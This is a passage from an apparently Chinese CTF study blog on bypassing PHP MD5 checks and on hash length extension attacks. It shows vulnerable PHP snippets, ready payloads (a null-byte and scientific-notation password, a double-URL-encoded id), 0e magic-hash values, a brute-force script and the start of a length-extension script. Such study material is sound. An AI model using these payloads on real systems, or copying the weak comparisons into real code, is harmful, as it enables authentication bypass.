class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;-&#x27;</span>) !== <span class="literal">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置 &#123;</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;have not been found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>要求输入password的长度小于8位，且值要大于9999999，并且需要匹配到<code>-</code>，这里就要用到科学计数法了：</strong></p><ul><li><strong>1e10 &#x3D; 10^10</strong></li></ul><p>而匹配<code>-</code>可用截断法，所以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1e10%00-</span><br></pre></td></tr></table></figure><h3 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</span><br></pre></td></tr></table></figure><h3 id="a-md5-a-，md5-a-md5-md5-a"><a href="#a-md5-a-，md5-a-md5-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)，md5($a)&#x3D;&#x3D;md5(md5($a))"></a>$a&#x3D;&#x3D;md5($a)，md5($a)&#x3D;&#x3D;md5(md5($a))</h3><p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$md5          md5($md5)</span><br><span class="line">0e00275209979 0e551387587965716321018342879905</span><br><span class="line">0e00506035745 0e224441551631909369101555335043</span><br><span class="line">0e00540451811 0e057099852684304412663796608095</span><br><span class="line">0e00678205148 0e934049274119262631743072394111</span><br><span class="line">0e00741250258 0e899567782965109269932883593603</span><br><span class="line">0e00928251504 0e148856674729228041723861799600</span><br><span class="line">0e01350016114 0e769018222125751782256460324867</span><br><span class="line">0e01352028862 0e388419153010508575572061606161</span><br><span class="line">0e01392313004 0e793314107039222217518920037885</span><br><span class="line">0e01875552079 0e780449305367629893512581736357</span><br><span class="line">0e01975903983 0e317084484960342086618161584202</span><br><span class="line">0e02042356163 0e335912055437180460060141819624</span><br><span class="line">0e02218562930 0e151492820470888772364059321579</span><br><span class="line">0e02451355147 0e866503534356013079241759641492</span><br><span class="line">0e02739970294 0e894318228115677783240047043017</span><br><span class="line">0e02760920150 0e413159393756646578537635311046</span><br><span class="line">0e02784726287 0e433955189140949269100965859496</span><br><span class="line">0e03298616350 0e851613188370453906408258609284</span><br><span class="line">0e03393034171 0e077847024281996293485700020358</span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMd5</span>(<span class="params">s</span>):</span><br><span class="line">    MD5 = hashlib.md5(s).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> MD5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;0e&quot;</span> <span class="keyword">and</span> MD5[<span class="number">2</span>:<span class="number">32</span>].isdigit():</span><br><span class="line">        <span class="built_in">print</span> s,MD5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">payload,s,slen</span>):</span><br><span class="line">    <span class="comment">#print &#x27;.&#x27;,</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == slen:</span><br><span class="line">        <span class="comment">#Custom string</span></span><br><span class="line">        calcMd5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">        sl= s+payload[j]</span><br><span class="line">        getStr(payload,sl,slen)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getStr(payload,<span class="string">&#x27;0e&#x27;</span>,<span class="number">13</span>)</span><br></pre></td></tr></table></figure><p><strong>MD5和双MD5都是<code>0e</code>开头的：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure><h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>哈希长度扩展攻击，简单的说就是由于hash的生成机制使得我们可以人为的在原先明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。</p><p>为了更好的解释该原理，下面以MD5算法举个例子</p><h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>MD5算法是典型的一种信息摘要算法，它是由md2、md3和md4演变而来的。无论是哪一种的md算法都是将一个<strong>任意长度</strong>的字符串加密为一串<strong>固定长度的密文</strong>。在这整个加密过程中，会将明文字符串转换为一个<strong>128位</strong>的消息摘要，接直把消息摘要转换为一个<strong>十六进制的字符串就会得到32位的字符串</strong>，也就是我们平时见到的MD5密文</p><blockquote><p><strong>因为MD5加密过程经过了压缩，加密和hash算法，所以MD5加密的内容是不可逆的</strong></p></blockquote><h4 id="MD5算法过程"><a href="#MD5算法过程" class="headerlink" title="MD5算法过程"></a>MD5算法过程</h4><p>要了解算法的原理过程，肯定需要一个流程图便于理解：</p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/20180813125243-b731fe76-9eb4-1.png"></p><p>大致步骤为：</p><ol><li>把消息分为n个分组</li><li>对最后一个消息分组进行填充</li><li>和输入量进行运算，运算结果位下一个分组的输入量</li><li>输出最终结果</li></ol><p>下面举个例子好理解一点：</p><p>比如我们需要对<code>1234567890123456</code>进行加密,首先我们需要将它转化为二进制，即：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转换结果 00110001 00110010 00110011 00110100 00110101 00110110 00110111 00111000 00111001 00110000 00110001 00110010 00110011 00110100 00110101 00110110</span></span><br></pre></td></tr></table></figure><p>因为一个ASCIl码对应8位二进制字符，所以我们得到了128位二进制字符，下面我们在winhex（需要转为十六进制）上观察：</p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20240814145527.png"></p><p>对于MD5算法来说，我们需要将原数据进行分块处理，以512位个二进制数据为一块，而最后一块的处理分为以下两种情况：</p><ul><li><strong>明文数据的二进制数据长度&lt;&#x3D;448，通过填充padding（无意义占位）数据使其长度为448，再添加原始明文数据的二进制长度信息（64）使其长度为512位即可。</strong></li><li><strong>明文数据的二进制数据长度大于448但小于等于512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</strong></li></ul><p><strong>对于padding数据（长度不定）来说：首位二进制位1，其余位为0.</strong></p><p>对于我们的数据只有128位二进制字符，所以我们需要填充到448位，又因为**10000000(2)&#x3D;80(16),**补充上去即可：</p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20240814152802.png" alt="QQ截图20240814152802"></p><p><strong>对于长度信息位（长度8Byte&#x3D;64bit)来说，我们还需补位8byte,从低位走向高位，原始明文为<code>1234567890123456</code>共16byte，有16*8&#x3D;128bit,转换为十六进制为80，写入倒数第八个byte位，之后补7byte的0x00：</strong></p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20240814154837.png"></p><p>接下来需要用这64byte的数据进行计算，与初始向量进行计算</p><p>计算信息的摘要需要用补位结果的数据进行运算，也就是补位后的512bit的消息，在计算时候有个初始的向量，这里初始的向量是一个固定的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A 01 23 45 67 0x67452301</span><br><span class="line">B 89 AB CD EF 0xEFCDAB89</span><br><span class="line">C FE DC BA 98 0x98BADCFE</span><br><span class="line">D 76 54 32 10 0x10325476</span><br></pre></td></tr></table></figure><p>由于在计算机存储中采用的是小端存储方式，所以上面初始化向量在程序中的初始化代码为后面的0x部分。</p><p>然后将刚才的<strong>512bit消息和初始化向量</strong>进行第一轮的运算，之后初始化向量会被新的值覆盖，最后一轮的向量经过高低位互换后就是计算出的MD5值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">高低位互换：</span><br><span class="line">    abcdef-&gt;fedcba</span><br></pre></td></tr></table></figure><p>高低位互换的过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假如最后一轮的运算后的向量值为：</span><br><span class="line">    A=0xabcdef12</span><br><span class="line">    B=0xabcdef12</span><br><span class="line">    C=0xabcdef12</span><br><span class="line">    D=0xabcdef12</span><br><span class="line">那么进行高低位互换之后得到的数值为：</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br></pre></td></tr></table></figure><p>进行拼接得到最后加密结果<br><code>12efcdab12efcdab12efcdab12efcdab</code></p><h3 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h3><p>上面我们也了解到了MD5的加密过程，而我们只要知道一个hash值，知道原来数据的数据长度，那么我们就可以算出<br><code>原数据+填充数据到512+任意内容</code>的hash值。</p><p>而有些ctf就是需要我们找填充的数据及填充后的hash值，当然我们不可能手搓，下面是关于该攻击的一个脚本</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: King kaki</span></span><br><span class="line"><span class="comment"># @Date:   2018-08-04 12:40:11</span></span><br><span class="line"><span class="comment"># @Last Modified by:   kingkk</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2018-08-12 15:08:28</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line">shi_1 = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span></span><br><span class="line">shi_2 = (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span></span><br><span class="line">shi_3 = (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span></span><br><span class="line">shi_4 = (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">m_1 = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">m_2 = (<span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>)</span><br><span class="line">m_3 = (<span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line">m_4 = (<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(<span class="number">4294967296</span> * <span class="built_in">abs</span>(math.sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">shift_list</span>):</span><br><span class="line">    shift_list = [shift_list[<span class="number">3</span>], shift_list[<span class="number">0</span>], shift_list[<span class="number">1</span>], shift_list[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> shift_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">fun_list, f, m, shi</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    <span class="keyword">while</span> count &lt; <span class="number">16</span>:</span><br><span class="line">        xx = <span class="built_in">int</span>(fun_list[<span class="number">0</span>], <span class="number">16</span>) + f(<span class="built_in">int</span>(fun_list[<span class="number">1</span>], <span class="number">16</span>), <span class="built_in">int</span>(fun_list[<span class="number">2</span>], <span class="number">16</span>), <span class="built_in">int</span>(fun_list[<span class="number">3</span>], <span class="number">16</span>)) + <span class="built_in">int</span>(m[count], <span class="number">16</span>) + T(Ti_count)</span><br><span class="line">        xx &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        ll = L(xx, shi[count])</span><br><span class="line">        fun_list[<span class="number">0</span>] = <span class="built_in">hex</span>((<span class="built_in">int</span>(fun_list[<span class="number">1</span>], <span class="number">16</span>) + ll) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        fun_list = shift(fun_list)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        Ti_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fun_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_m16</span>(<span class="params">order, ascii_list, f_offset</span>):</span><br><span class="line">    ii = <span class="number">0</span></span><br><span class="line">    m16 = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    f_offset *= <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        i *= <span class="number">4</span></span><br><span class="line">        m16[ii] = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join((ascii_list[i + f_offset] + ascii_list[i + <span class="number">1</span> + f_offset] + ascii_list[i + <span class="number">2</span> + f_offset] + ascii_list[i + <span class="number">3</span> + f_offset]).split(<span class="string">&#x27;0x&#x27;</span>))</span><br><span class="line">        ii += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m16)):</span><br><span class="line">        m16[ind] = reverse_hex(m16[ind])</span><br><span class="line">    <span class="keyword">return</span> m16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex</span>(<span class="params">hex_str</span>):</span><br><span class="line">    hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) &lt; <span class="number">8</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(hex_str)) + hex_str</span><br><span class="line">    hex_str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>):</span><br><span class="line">        hex_str_list.append(hex_str[i:i + <span class="number">2</span>])</span><br><span class="line">    hex_str_list.reverse()</span><br><span class="line">    hex_str_result = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(hex_str_list)</span><br><span class="line">    <span class="keyword">return</span> hex_str_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_result</span>(<span class="params">f_list</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    f_list1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f_list:</span><br><span class="line">        f_list1[f_list.index(i)] = reverse_hex(i)[<span class="number">2</span>:]</span><br><span class="line">        result += f_list1[f_list.index(i)]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">input_m, msg_lenth=<span class="number">0</span></span>):</span><br><span class="line">    ascii_list = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, <span class="built_in">map</span>(<span class="built_in">ord</span>, input_m)))</span><br><span class="line">    msg_lenth += <span class="built_in">len</span>(ascii_list) * <span class="number">8</span></span><br><span class="line">    ascii_list.append(<span class="string">&#x27;0x80&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ascii_list)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ascii_list[i]) &lt; <span class="number">4</span>:</span><br><span class="line">            ascii_list[i] = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;0&#x27;</span> + ascii_list[i][<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">        ascii_list.append(<span class="string">&#x27;0x00&#x27;</span>)</span><br><span class="line">    msg_lenth_0x = <span class="built_in">hex</span>(msg_lenth)[<span class="number">2</span>:]</span><br><span class="line">    msg_lenth_0x = <span class="string">&#x27;0x&#x27;</span> + msg_lenth_0x.rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[<span class="number">2</span>:]</span><br><span class="line">    msg_lenth_0x_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_lenth_0x_big_order), <span class="number">2</span>):</span><br><span class="line">        msg_lenth_0x_list.append(<span class="string">&#x27;0x&#x27;</span> + msg_lenth_0x_big_order[i: i + <span class="number">2</span>])</span><br><span class="line">    ascii_list.extend(msg_lenth_0x_list)</span><br><span class="line">    <span class="keyword">return</span> ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">input_m</span>):</span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    Ti_count = <span class="number">1</span></span><br><span class="line">    abcd_list = [<span class="string">&#x27;0x67452301&#x27;</span>, <span class="string">&#x27;0xefcdab89&#x27;</span>, <span class="string">&#x27;0x98badcfe&#x27;</span>, <span class="string">&#x27;0x10325476&#x27;</span>]</span><br><span class="line">    ascii_list = padding(input_m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ascii_list) // <span class="number">64</span>):</span><br><span class="line">        aa, bb, cc, dd = abcd_list</span><br><span class="line">        order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">        order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">        order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">        order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">        abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">        abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">        abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">        abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">        output_a = <span 